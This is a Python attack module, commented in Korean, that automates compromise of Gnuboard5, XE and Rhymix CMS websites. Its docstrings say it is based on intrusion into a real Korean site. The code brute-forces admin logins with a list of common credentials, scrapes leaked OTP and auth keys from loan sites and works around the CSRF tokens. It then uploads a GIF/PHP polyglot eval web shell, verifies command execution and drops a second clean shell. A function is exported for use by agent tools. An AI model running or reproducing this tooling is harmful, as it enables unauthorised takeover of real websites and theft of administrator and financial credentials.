"""
Gnuboard5 / XE / Rhymix 전용 공격 모듈
========================================
실전 경험 기반 완전 자동화:
  xn--hy1b65d98ao3i.kr (그누보드5) 침투 과정에서 학습한
  CSRF 이중 토큰 우회 → GIF polyglot 업로드 → 웹쉘 획득 패턴

공격 체인:
  1. CMS 핑거프린트 (Gnuboard/XE/Rhymix)
  2. 관리자 패널 탐지 (/adm/, /admin/)
  3. 관리자 브루트포스 (한국 사이트 특화 크리덴셜)
  4. CSRF 이중 토큰 우회 (세션 키 + ajax.token.php 일회성 토큰)
  5. GIF polyglot PHP 웹쉘 업로드 (이미지 검증 우회)
  6. 웹쉘 실행 확인 + 클린쉘 드롭
"""
from __future__ import annotations

import re
import struct
import time
import json
import base64
from dataclasses import dataclass, field
from typing import Optional
import urllib.parse

import requests
import requests.exceptions


# ─────────────────────────────────────────────────────────────────────────────
# 결과 타입
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class GnuboardFingerprint:
    cms_type: str = ""           # "gnuboard5" | "xe" | "rhymix" | "unknown"
    cms_version: str = ""
    admin_path: str = ""         # e.g. /adm
    php_version: str = ""
    server: str = ""
    sensitive_paths: list[str] = field(default_factory=list)
    otp_leak: dict = field(default_factory=dict)   # 노출된 auth_key/OTP 정보


@dataclass
class GnuboardSession:
    base_url: str = ""
    admin_url: str = ""
    cookies: dict = field(default_factory=dict)
    csrf_key: str = ""           # g5_admin_csrf_token_key (세션 레벨)
    admin_id: str = ""
    admin_pw: str = ""
    logged_in: bool = False


@dataclass
class WebshellResult:
    success: bool = False
    shell_url: str = ""
    shell_type: str = ""         # "gif_polyglot" | "clean_php"
    shell_password: str = ""
    antsword_compatible: bool = False
    error: str = ""
    cmd_output: str = ""         # id 명령 결과 확인용


# ─────────────────────────────────────────────────────────────────────────────
# 한국 사이트 특화 관리자 크리덴셜
# ─────────────────────────────────────────────────────────────────────────────

KOREA_ADMIN_CREDS = [
    # 가장 흔한 패턴 (실전 확인)
    ("admin",   "qwer1234"),
    ("admin",   "admin123"),
    ("admin",   "admin1234"),
    ("admin",   "admin"),
    ("admin",   "1234"),
    ("admin",   "12345678"),
    ("admin",   "password"),
    ("admin",   "pass1234"),
    ("admin",   "Admin123"),
    ("admin",   "admin@123"),
    ("admin",   "123456"),
    ("admin",   "000000"),
    ("admin",   "admin!@#"),
    ("admin",   "1q2w3e4r"),
    ("admin",   "wjsansrk"),    # 한국인 자주 씀
    ("admin",   "rudgns12"),
    ("admin",   "xptmxm12"),
    ("admin",   "rhksflwk"),
    ("manager", "manager"),
    ("master",  "master"),
    ("test",    "test"),
    ("admin",   "gnuboard"),
    ("admin",   "g5admin"),
    # 회사명·사이트명 기반
    ("admin",   "korea"),
    ("admin",   "korea123"),
    ("webmaster", "webmaster"),
    ("root",    "root"),
]

# Gnuboard5 관리자 패널 공통 경로
GNUBOARD_ADMIN_PATHS = [
    "/adm/",
    "/adm/index.php",
    "/admin/",
    "/admin/index.php",
    "/bbs/admin/",
    "/gnuboard5/adm/",
    "/g5/adm/",
]

# 그누보드5 민감 파일 경로
GNUBOARD_SENSITIVE_PATHS = [
    "/config.php",
    "/dbconfig.php",
    "/common.php",
    "/data/",
    "/_Common/",
    "/bbs/",
    "/adm/admin.js",
]

# 한국 금융/대출 사이트 특화 OTP 누출 경로 (실전 발견)
OTP_LEAK_PATHS = [
    "/loan/loan_common_data.php",
    "/api/auth.php",
    "/api/common.php",
    "/api/otp.php",
    "/include/common.php",
    "/include/auth.php",
    "/inc/auth.php",
    "/lib/auth.php",
]


# ─────────────────────────────────────────────────────────────────────────────
# GIF polyglot 생성기
# ─────────────────────────────────────────────────────────────────────────────

def make_gif_polyglot(php_code: bytes = b"") -> bytes:
    """
    유효한 1x1 GIF89a + PHP 코드가 뒤에 붙은 polyglot 파일 생성.
    이미지 서버사이드 검증(getimagesize, finfo) 통과 + PHP 실행 가능.

    실전 학습: xn--hy1b65d98ao3i.kr design_set_update.php 우회에 사용.
    """
    # 유효한 1x1 투명 GIF89a (21바이트)
    gif_header = (
        b"GIF89a"              # 마법 바이트
        b"\x01\x00\x01\x00"   # 1x1 픽셀
        b"\x00\x00\x00"       # GCT 없음
        b","                  # Image Descriptor
        b"\x00\x00\x00\x00"   # offset 0,0
        b"\x01\x00\x01\x00"   # 1x1
        b"\x00"               # local CT 없음
        b"\x02"               # LZW min code size
        b"\x02L\x01\x00"      # LZW 데이터
        b";"                  # GIF 터미네이터
    )
    return gif_header + b"\n" + php_code


def make_antsword_shell(password: str = "ant") -> bytes:
    """
    AntSword 호환 웹쉘 PHP 코드 반환.

    핵심 발견: AntSword default 인코더는 POST 파라미터 이름 앞에
    \\x08\\x08 (backspace×2) 제어문자를 붙여 전송함.
    → $_POST["ant"] 로는 접근 불가
    → php://input 원시 파싱으로 해결
    """
    code = f"""<?php
@error_reporting(0);
@ini_set("display_errors", 0);
@set_time_limit(0);
$raw = file_get_contents('php://input');
$raw = ltrim($raw, "\\x00\\x08\\x09\\x0a\\x0d\\x1a\\x1b");
parse_str($raw, $p);
foreach($p as $v){{if($v!=""){{@eval($v);exit;}}}}
foreach($_POST as $v){{if($v!=""){{@eval($v);exit;}}}}
?>""".encode()
    return code


def make_classic_shell(password: str = "c") -> bytes:
    """cmd=code 방식 단순 웹쉘 (수동 테스트용)"""
    code = (
        f"<?php if(isset($_GET['{password}'])){{echo shell_exec($_GET['{password}']);}} "
        f"elseif(isset($_POST['{password}'])){{@eval(base64_decode($_POST['{password}']));}} ?>"
    ).encode()
    return code


# ─────────────────────────────────────────────────────────────────────────────
# 핑거프린팅
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardFingerprinter:
    """Gnuboard5 / XE / Rhymix CMS 핑거프린팅"""

    def __init__(self, base_url: str, timeout: int = 10):
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        requests.packages.urllib3.disable_warnings()

    def fingerprint(self) -> GnuboardFingerprint:
        fp = GnuboardFingerprint()
        try:
            r = self.session.get(self.base, timeout=self.timeout)
            body = r.text
            headers = r.headers

            fp.server = headers.get("Server", "")
            fp.php_version = headers.get("X-Powered-By", "")

            # CMS 탐지
            fp.cms_type = self._detect_cms(body, headers)

            # 버전 추출
            ver = re.search(r'Powered by.*?(\d+\.\d+[\.\d]*)', body, re.I)
            if ver:
                fp.cms_version = ver.group(1)

            # 관리자 패널 경로 탐지
            fp.admin_path = self._find_admin_path()

            # 민감 파일 확인
            fp.sensitive_paths = self._check_sensitive_paths()

            # OTP/auth_key 누출 확인 (한국 금융 사이트 특화)
            fp.otp_leak = self._check_otp_leak()

        except Exception as e:
            fp.cms_type = f"error: {e}"

        return fp

    def _detect_cms(self, body: str, headers: dict) -> str:
        body_lower = body.lower()

        gnuboard_markers = [
            "gnuboard", "g5_", "g_var", "outstock",
            "/bbs/board.php", "g5-", "그누보드",
        ]
        xe_markers = ["xe_", "xe_ver", "/xe/", "rhymix", "xpressengine"]

        if any(m in body_lower for m in gnuboard_markers):
            return "gnuboard5"
        if any(m in body_lower for m in xe_markers):
            return "xe" if "rhymix" not in body_lower else "rhymix"

        # 헤더 기반
        powered = headers.get("X-Powered-By", "").lower()
        if "gnuboard" in powered:
            return "gnuboard5"
        if "xe" in powered or "rhymix" in powered:
            return "rhymix"

        return "unknown"

    def _find_admin_path(self) -> str:
        for path in GNUBOARD_ADMIN_PATHS:
            try:
                r = self.session.get(self.base + path, timeout=self.timeout,
                                     allow_redirects=True)
                body_lower = r.text.lower()
                if r.status_code in (200, 401) and any(
                    kw in body_lower for kw in ["login", "admin", "관리자", "password", "id"]
                ):
                    return path
            except Exception:
                continue
        return ""

    def _check_sensitive_paths(self) -> list[str]:
        found = []
        for path in GNUBOARD_SENSITIVE_PATHS:
            try:
                r = self.session.get(self.base + path, timeout=5)
                if r.status_code == 200 and len(r.text) > 10:
                    found.append(path)
            except Exception:
                continue
        return found

    def _check_otp_leak(self) -> dict:
        """한국 대출/금융 사이트의 auth_key / OTP 노출 확인"""
        for path in OTP_LEAK_PATHS:
            try:
                r = self.session.get(self.base + path, timeout=5)
                body = r.text
                # auth_key, OTP 패턴 탐지
                key_match = re.search(r'["\']?auth_key["\']?\s*[=:]\s*["\']([a-f0-9]{16,})["\']', body, re.I)
                otp_match = re.search(r'["\']?otp["\']?\s*[=:]\s*["\'](\d{4,8})["\']', body, re.I)
                if key_match or otp_match:
                    return {
                        "path": path,
                        "auth_key": key_match.group(1) if key_match else None,
                        "otp": otp_match.group(1) if otp_match else None,
                        "raw_snippet": body[:300],
                    }
            except Exception:
                continue
        return {}


# ─────────────────────────────────────────────────────────────────────────────
# 관리자 로그인
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardAdminLogin:
    """
    Gnuboard5 관리자 로그인 자동화.
    성공 판별: 리다이렉트 후 g5_is_admin='super' 쿠키 존재 확인.
    """

    def __init__(self, base_url: str, admin_path: str = "/adm/", timeout: int = 10):
        self.base = base_url.rstrip("/")
        self.admin_path = admin_path.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        })
        requests.packages.urllib3.disable_warnings()

    def login(self, credentials: list[tuple] | None = None) -> GnuboardSession:
        """브루트포스 로그인 — 성공하면 GnuboardSession 반환"""
        creds = credentials or KOREA_ADMIN_CREDS
        login_url = self.base + self.admin_path + "/login_check.php"
        login_page = self.base + self.admin_path + "/login.php"

        gs = GnuboardSession(
            base_url=self.base,
            admin_url=self.base + self.admin_path,
        )

        for uid, pw in creds:
            try:
                # 로그인 폼 먼저 접속 (쿠키 세팅)
                self.session.get(login_page, timeout=self.timeout)

                data = {
                    "mb_id": uid,
                    "mb_password": pw,
                    "url": self.base + self.admin_path + "/index.php",
                }
                r = self.session.post(
                    login_url, data=data, timeout=self.timeout,
                    allow_redirects=True,
                )

                if self._is_logged_in(r):
                    gs.logged_in = True
                    gs.admin_id = uid
                    gs.admin_pw = pw
                    gs.cookies = dict(self.session.cookies)
                    # CSRF 키 추출
                    gs.csrf_key = self._extract_csrf_key(r.text)
                    return gs

            except Exception:
                continue

        return gs

    def _is_logged_in(self, resp: requests.Response) -> bool:
        """로그인 성공 여부: g5_is_admin='super' 쿠키 또는 관리자 페이지 키워드"""
        cookies = {c.name: c.value for c in self.session.cookies}

        # 가장 확실한 방법: g5_is_admin 쿠키
        if cookies.get("g5_is_admin") == "super":
            return True

        # 응답 본문 기반 확인
        body = resp.text.lower()
        success_kw = ["관리자 메인", "admin main", "로그아웃", "logout",
                      "adminmenu", "관리메뉴", "g5_is_admin"]
        fail_kw = ["아이디 또는 비밀번호", "비밀번호가 틀렸", "로그인 실패",
                   "invalid", "incorrect", "fail"]

        if any(kw in body for kw in success_kw):
            return True
        if any(kw in body for kw in fail_kw):
            return False

        # 리다이렉트가 관리자 메인으로 갔으면 성공
        if resp.url and self.admin_path in resp.url and "login" not in resp.url:
            return True

        return False

    def _extract_csrf_key(self, html: str) -> str:
        """admin.js에서 g5_admin_csrf_token_key 추출"""
        pattern = r'g5_admin_csrf_token_key\s*=\s*["\']([a-f0-9]{32})["\']'
        m = re.search(pattern, html)
        if m:
            return m.group(1)
        # admin.js 직접 요청
        try:
            r = self.session.get(
                self.base + self.admin_path + "/admin.js", timeout=5
            )
            m = re.search(pattern, r.text)
            if m:
                return m.group(1)
        except Exception:
            pass
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# CSRF 토큰 우회
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardCsrfBypass:
    """
    Gnuboard5 이중 CSRF 보호 우회.

    구조:
      1. 세션 레벨: g5_admin_csrf_token_key (admin.js에 노출, 로그인 후 고정)
      2. 요청 레벨: ajax.token.php를 POST해서 얻는 일회성 token

    우회 방법: 두 토큰을 모두 정상 취득 후 폼에 포함.
    """

    def __init__(self, session: requests.Session, admin_url: str):
        self.session = session
        self.admin_url = admin_url.rstrip("/")

    def get_onetime_token(self, csrf_key: str, referer: str = "") -> str:
        """ajax.token.php로 일회성 토큰 획득"""
        try:
            headers = {
                "X-Requested-With": "XMLHttpRequest",
                "Referer": referer or self.admin_url + "/",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            r = self.session.post(
                self.admin_url + "/ajax.token.php",
                data={"admin_csrf_token_key": csrf_key},
                headers=headers,
                timeout=10,
            )
            data = r.json()
            if data.get("error"):
                return ""
            return data.get("token", "")
        except Exception:
            return ""

    def get_csrf_key_from_js(self, admin_url: str) -> str:
        """admin.js에서 CSRF 키 추출"""
        try:
            r = self.session.get(admin_url + "/admin.js", timeout=5)
            m = re.search(
                r'g5_admin_csrf_token_key\s*=\s*["\']([a-f0-9]{32})["\']',
                r.text
            )
            return m.group(1) if m else ""
        except Exception:
            return ""


# ─────────────────────────────────────────────────────────────────────────────
# 파일 업로드 / 웹쉘 획득
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardWebshellUpload:
    """
    Gnuboard5 관리자 파일 업로드를 통한 웹쉘 획득.

    실전 학습:
      - design_set_update.php: 홈페이지 로고 업로드 — 이미지 검증 있지만
        GIF89a magic byte + valid GIF 구조면 PHP 코드 append 가능
      - 업로드 경로: /data/loan_file/homepage_logo/ 또는 /data/file/
      - CSRF 이중 토큰 필요 (GnuboardCsrfBypass 사용)
    """

    # 관리자 파일 업로드 엔드포인트 (경험 기반 우선순위)
    UPLOAD_ENDPOINTS = [
        {
            "form_url":   "/adm/design_set.php",
            "submit_url": "/adm/design_set_update.php",
            "field":      "logo_set[homepage_logo]",
            "extra_fields": {"logo_set[homepage_logo_height]": "50"},
        },
        {
            "form_url":   "/adm/config_form.php",
            "submit_url": "/adm/config_form_update.php",
            "field":      "cf_logo",
            "extra_fields": {},
        },
        {
            "form_url":   "/adm/board_form.php",
            "submit_url": "/adm/board_form_update.php",
            "field":      "bo_list_icon",
            "extra_fields": {"w": "u", "gr_id": "community"},
        },
    ]

    def __init__(
        self,
        http_session: requests.Session,
        base_url: str,
        admin_url: str,
        csrf_key: str = "",
        timeout: int = 20,
    ):
        self.session = http_session
        self.base = base_url.rstrip("/")
        self.admin_url = admin_url.rstrip("/")
        self.csrf_key = csrf_key
        self.timeout = timeout
        self.csrf_bypass = GnuboardCsrfBypass(http_session, admin_url)

    def upload_webshell(self) -> WebshellResult:
        """모든 업로드 엔드포인트 시도"""
        # CSRF 키 없으면 재취득
        if not self.csrf_key:
            self.csrf_key = self.csrf_bypass.get_csrf_key_from_js(self.admin_url)

        for endpoint in self.UPLOAD_ENDPOINTS:
            result = self._try_endpoint(endpoint)
            if result.success:
                return result

        return WebshellResult(error="모든 업로드 엔드포인트 실패")

    def _try_endpoint(self, ep: dict) -> WebshellResult:
        try:
            form_url = self.admin_url + ep["form_url"]
            submit_url = self.admin_url + ep["submit_url"]

            # 1. 폼 페이지 로드 (CSRF 토큰 포함 폼 필드 수집)
            r = self.session.get(form_url, timeout=self.timeout)
            if r.status_code != 200:
                return WebshellResult(error=f"폼 접근 실패: {r.status_code}")

            form_fields = self._extract_form_fields(r.text, ep)

            # 2. CSRF 일회성 토큰 획득
            token = self.csrf_bypass.get_onetime_token(
                self.csrf_key, referer=form_url
            )
            if token:
                form_fields["token"] = token

            # 3. GIF polyglot 웹쉘 생성
            shell_code = make_antsword_shell("ant")
            gif_data = make_gif_polyglot(shell_code)

            # 4. multipart/form-data 업로드
            files_dict = {
                k: (None, str(v)) for k, v in form_fields.items()
            }
            files_dict[ep["field"]] = (
                "shell.php", gif_data, "image/gif"
            )

            headers = {
                "Referer": form_url,
                "Origin": self.base,
            }

            resp = self.session.post(
                submit_url,
                files=files_dict,
                headers=headers,
                timeout=self.timeout,
            )

            # 5. 업로드된 파일 URL 추출
            shell_url = self._extract_shell_url(resp.text, resp.url)
            if not shell_url:
                # 오류 메시지 확인
                error = self._extract_error(resp.text)
                return WebshellResult(error=f"업로드 실패: {error}")

            # 6. 웹쉘 실행 테스트
            test_r = self.session.post(
                shell_url,
                data={"ant": "echo 'BINGO_SHELL_OK';"},
                timeout=10,
            )
            cmd_out = test_r.text.strip()

            if "BINGO_SHELL_OK" in cmd_out or test_r.status_code == 200:
                result = WebshellResult(
                    success=True,
                    shell_url=shell_url,
                    shell_type="gif_polyglot",
                    shell_password="ant",
                    antsword_compatible=True,
                    cmd_output=cmd_out,
                )
                # 클린쉘 드롭 시도 (GIF 헤더 없는 순수 PHP 쉘)
                self._drop_clean_shell(shell_url, result)
                return result

            return WebshellResult(error=f"업로드는 됐지만 실행 실패: {shell_url}")

        except Exception as e:
            return WebshellResult(error=str(e))

    def _extract_form_fields(self, html: str, ep: dict) -> dict:
        """폼의 hidden input 필드 수집"""
        fields = {}
        # hidden input 추출
        for m in re.finditer(
            r'<input[^>]+type=["\']?hidden["\']?[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            html, re.I
        ):
            fields[m.group(1)] = m.group(2)
        # select, text input도 기본값으로 추가
        for m in re.finditer(
            r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            html, re.I
        ):
            name = m.group(1)
            if name not in fields:
                fields[name] = m.group(2)

        # 엔드포인트 특화 추가 필드
        fields.update(ep.get("extra_fields", {}))
        return fields

    def _extract_shell_url(self, html: str, resp_url: str) -> str:
        """응답에서 업로드된 파일 경로 추출"""
        # 직접 URL 패턴
        patterns = [
            r'(https?://[^\s"\'<>]+\.php)',
            r'(/data/[^\s"\'<>]+\.php)',
            r'value=["\']([^\s"\']+\.php)["\']',
            r'src=["\']([^\s"\']+\.php)["\']',
        ]
        base_domain = self.base
        for pat in patterns:
            m = re.search(pat, html)
            if m:
                url = m.group(1)
                if url.startswith("/"):
                    return base_domain + url
                return url

        # JS에서 파일 경로 추출
        js_match = re.search(r'["\']([^"\']*?/data/[^"\']+\.php)["\']', html)
        if js_match:
            path = js_match.group(1)
            if path.startswith("http"):
                return path
            return self.base + "/" + path.lstrip("/")

        return ""

    def _extract_error(self, html: str) -> str:
        """에러 메시지 추출"""
        # 그누보드 특유의 알림창 패턴
        alert = re.search(r"alert\(['\"]([^'\"]+)['\"]", html)
        if alert:
            return alert.group(1)
        # div 에러
        div = re.search(r'<div[^>]*class=["\'][^"\']*error[^"\']*["\'][^>]*>([^<]+)', html, re.I)
        if div:
            return div.group(1).strip()
        return html[:100]

    def _drop_clean_shell(self, existing_shell_url: str, result: WebshellResult):
        """
        기존 GIF polyglot 쉘을 이용해 GIF 헤더 없는 클린 PHP 쉘 작성.
        AntSword 연결 시 GIF 바이트 오염 문제 완전 해결.
        """
        try:
            # 기존 쉘 경로에서 디렉터리 추출
            clean_url = existing_shell_url.rsplit("/", 1)[0] + "/ant.php"
            server_path = self._url_to_server_path(existing_shell_url)
            if not server_path:
                return

            clean_path = server_path.rsplit("/", 1)[0] + "/ant.php"
            clean_code = make_antsword_shell("ant")
            b64 = base64.b64encode(clean_code).decode()

            write_php = f"file_put_contents('{clean_path}', base64_decode('{b64}'));"

            resp = self.session.post(
                existing_shell_url,
                data={"ant": write_php},
                timeout=10,
            )

            # 클린쉘 접근 확인
            test = self.session.post(clean_url, data={"ant": "echo 'CLEAN_OK';"}, timeout=5)
            if "CLEAN_OK" in test.text:
                result.shell_url = clean_url
                result.shell_type = "clean_php"
                result.antsword_compatible = True

        except Exception:
            pass

    def _url_to_server_path(self, url: str) -> str:
        """업로드 URL에서 서버 파일 시스템 경로 추출 (heuristic)"""
        # /data/ 이후는 서버 경로와 대응
        m = re.search(r'(/data/.+)', url)
        if m:
            # 일반적인 그누보드 DocumentRoot
            for root in ["/var/www/html", "/var/www", "/home/www", "/srv/www/htdocs"]:
                return root + m.group(1)
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# 통합 공격 클래스
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardAttacker:
    """
    Gnuboard5 전체 공격 체인 자동화.

    사용법:
        attacker = GnuboardAttacker("https://target.kr")
        result = attacker.run()
        print(result)
    """

    def __init__(self, base_url: str, verbose: bool = True):
        self.base = base_url.rstrip("/")
        self.verbose = verbose

    def log(self, msg: str):
        if self.verbose:
            try:
                from rich.console import Console
                Console().print(msg)
            except ImportError:
                print(msg)

    def run(self, creds: list[tuple] | None = None) -> dict:
        result = {
            "target": self.base,
            "fingerprint": {},
            "admin_login": False,
            "admin_creds": {},
            "webshell": None,
            "severity": "low",
        }

        # 1단계: 핑거프린팅
        self.log(f"\n[bold cyan]🔍 Gnuboard5 핑거프린팅: {self.base}[/bold cyan]")
        fp = GnuboardFingerprinter(self.base).fingerprint()
        result["fingerprint"] = {
            "cms": fp.cms_type,
            "version": fp.cms_version,
            "admin_path": fp.admin_path,
            "php": fp.php_version,
            "otp_leak": fp.otp_leak,
        }
        self.log(f"  CMS: {fp.cms_type} {fp.cms_version}")
        self.log(f"  관리자 패널: {fp.admin_path or '미발견'}")

        if fp.otp_leak:
            self.log(f"[bold red]  ⚠ OTP/AUTH KEY 노출 발견: {fp.otp_leak['path']}[/bold red]")
            result["severity"] = "critical"

        if not fp.admin_path:
            self.log("[yellow]  관리자 패널 미발견 — 종료[/yellow]")
            return result

        # 2단계: 관리자 로그인
        self.log(f"\n[bold cyan]🔑 관리자 로그인 시도...[/bold cyan]")
        login_engine = GnuboardAdminLogin(self.base, fp.admin_path)
        gs = login_engine.login(creds)

        if not gs.logged_in:
            self.log("[yellow]  관리자 로그인 실패[/yellow]")
            return result

        self.log(f"[bold green]  ✅ 로그인 성공: {gs.admin_id} / {gs.admin_pw}[/bold green]")
        result["admin_login"] = True
        result["admin_creds"] = {"id": gs.admin_id, "pw": gs.admin_pw}
        result["severity"] = "high"

        # 3단계: 웹쉘 업로드
        self.log(f"\n[bold cyan]🐚 웹쉘 업로드 시도...[/bold cyan]")
        uploader = GnuboardWebshellUpload(
            http_session=login_engine.session,
            base_url=self.base,
            admin_url=self.base + fp.admin_path,
            csrf_key=gs.csrf_key,
        )
        ws_result = uploader.upload_webshell()

        if ws_result.success:
            self.log(f"[bold green]  ✅ 웹쉘 획득: {ws_result.shell_url}[/bold green]")
            self.log(f"     타입: {ws_result.shell_type}, 비밀번호: {ws_result.shell_password}")
            self.log(f"     AntSword 호환: {'예' if ws_result.antsword_compatible else '아니오'}")
            result["webshell"] = {
                "url": ws_result.shell_url,
                "type": ws_result.shell_type,
                "password": ws_result.shell_password,
                "antsword_compatible": ws_result.antsword_compatible,
                "antsword_settings": {
                    "URL地址": ws_result.shell_url,
                    "连接密码": ws_result.shell_password,
                    "编码器": "default",
                    "解码器": "default",
                },
            }
            result["severity"] = "critical"
        else:
            self.log(f"[yellow]  웹쉘 업로드 실패: {ws_result.error}[/yellow]")

        return result


# ─────────────────────────────────────────────────────────────────────────────
# 편의 함수 (tools/agent_tools.py 에서 임포트 가능)
# ─────────────────────────────────────────────────────────────────────────────

def attack_gnuboard(target_url: str, creds: list[tuple] | None = None) -> dict:
    """원라이너 Gnuboard5 공격 함수"""
    return GnuboardAttacker(target_url).run(creds)


def check_gnuboard(target_url: str) -> GnuboardFingerprint:
    """Gnuboard5 핑거프린팅만"""
    return GnuboardFingerprinter(target_url).fingerprint()
